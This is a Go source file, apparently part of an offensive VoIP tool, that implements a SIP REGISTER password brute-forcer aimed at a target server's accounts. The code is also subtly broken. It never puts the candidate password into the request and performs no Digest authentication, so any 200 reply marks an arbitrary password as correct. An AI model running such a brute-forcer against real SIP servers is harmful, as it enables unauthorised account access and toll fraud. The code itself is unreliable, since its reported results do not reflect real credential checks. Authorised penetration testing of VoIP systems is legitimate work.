package exploit

import (
	"context"
	"fmt"
	"time"

	"github.com/ismailtsdln/VoIPrax/internal/logger"
	"github.com/ismailtsdln/VoIPrax/internal/sip"
)

// BruteForcer handles SIP registration or invite brute forcing
type BruteForcer struct {
	stack  *sip.Stack
	logger *logger.Logger
}

// NewBruteForcer creates a new BruteForcer instance
func NewBruteForcer(stack *sip.Stack, log *logger.Logger) *BruteForcer {
	return &BruteForcer{
		stack:  stack,
		logger: log,
	}
}

// RegisterBruteForce attempts to brute force a REGISTER request
func (b *BruteForcer) RegisterBruteForce(ctx context.Context, targetAddr, username string, passwords []string) (string, error) {
	for _, password := range passwords {
		select {
		case <-ctx.Done():
			return "", ctx.Err()
		default:
			// Minimal REGISTER message - real implementation would need Digest Auth handling
			msg := &sip.Message{
				Method:     "REGISTER",
				RequestURI: fmt.Sprintf("sip:%s", targetAddr),
				Version:    "SIP/2.0",
				Headers: map[string][]string{
					"Via":            {"SIP/2.0/UDP 127.0.0.1:5060"},
					"From":           {fmt.Sprintf("<sip:%s@%s>", username, targetAddr)},
					"To":             {fmt.Sprintf("<sip:%s@%s>", username, targetAddr)},
					"Call-ID":        {"bruteforce-id-123"},
					"CSeq":           {"1 REGISTER"},
					"Contact":        {"<sip:voiprax@127.0.0.1:5060>"},
					"Content-Length": {"0"},
				},
			}

			err := b.stack.SendUDP(targetAddr, msg)
			if err != nil {
				return "", fmt.Errorf("failed to send REGISTER: %w", err)
			}

			// Wait for response
			resp, _, err := b.stack.ReceiveUDP(ctx, 2*time.Second)
			if err != nil {
				b.logger.Debug().Err(err).Str("password", password).Msg("No response for REGISTER")
				continue
			}

			if resp.StatusCode == 200 {
				return password, nil
			}

			b.logger.Debug().Int("status", resp.StatusCode).Str("password", password).Msg("Registration failed")
		}
	}

	return "", fmt.Errorf("brute force failed: no valid password found")
}
